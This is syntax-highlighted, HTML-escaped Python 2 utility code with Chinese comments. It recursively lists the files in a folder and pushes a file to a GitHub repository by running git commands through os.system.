&lt;span class=&quot;n&quot;&gt;tmp_all_file_name_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_all_file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ext_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#exp_list为空时,得到目录下的所有文件名,不返回空文件夹名&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#返回结果为文件名列表,不是完全绝对路径名&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#eg.folder=&quot;/root&quot;时,当/root目录下有一个文件夹a,一个文件2.txt,a中有一个文件1.txt&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#得到的函数返回值为[&#39;a/1.txt&#39;,&#39;2.txt&#39;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp_get_file_name_value&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root_dir&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp_all_file_name_list&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tmp_get_file_name_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp_get_file_name_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;root_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;root_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;allfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;each_abspath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;get_all_file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ext_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;#print each_abspath&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
                &lt;span class=&quot;c&quot;&gt;#print filename&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ext_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;tmp_all_file_name_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each_ext&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ext_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;.&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                            &lt;span class=&quot;c&quot;&gt;#print filename&lt;/span&gt;
                            &lt;span class=&quot;n&quot;&gt;tmp_all_file_name_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;c&quot;&gt;#print each&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ext_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;tmp_all_file_name_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each_ext&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ext_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;.&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                            &lt;span class=&quot;c&quot;&gt;#print each&lt;/span&gt;
                            &lt;span class=&quot;n&quot;&gt;tmp_all_file_name_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp_all_file_name_list&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;save2github&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;repo_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;comment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#将文件上传到github&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#arg1:文件绝对路经&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#arg2:远程仓库名&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#提交的commit注释&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/root/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;repo_name&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;remote_resp_uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://github.com/3xp10it/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.git&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repo_name&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mkdir &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; cd &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; git init &amp;amp;&amp;amp; git pull &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; git remote add origin &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; git status&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_resp_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_resp_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;warning!warning!warning! I will exit! There exists a same name script in local_resp_path(&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s),and this script is downloaded from remote github repo,you should rename your script if you want to upload it to git:)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cp &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;succeed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cd &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git commit -a -m &#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&#39; &amp;amp;&amp;amp; git push -u origin master&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;comment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;succeed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;push succeed!!!&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;push to git wrong,wrong,wrong,check it!!!&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/.git&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;warning!warning!warning! I will exit! There exists a same name script in local_resp_path(&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s),you should rename your script if you want to upload it to git:)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mkdir /tmp/codetmp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cd &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; cp -r * /tmp/codetmp/ &amp;amp;&amp;amp; rm -r * &amp;amp;&amp;amp;  git init &amp;amp;&amp;amp; git pull &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_resp_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
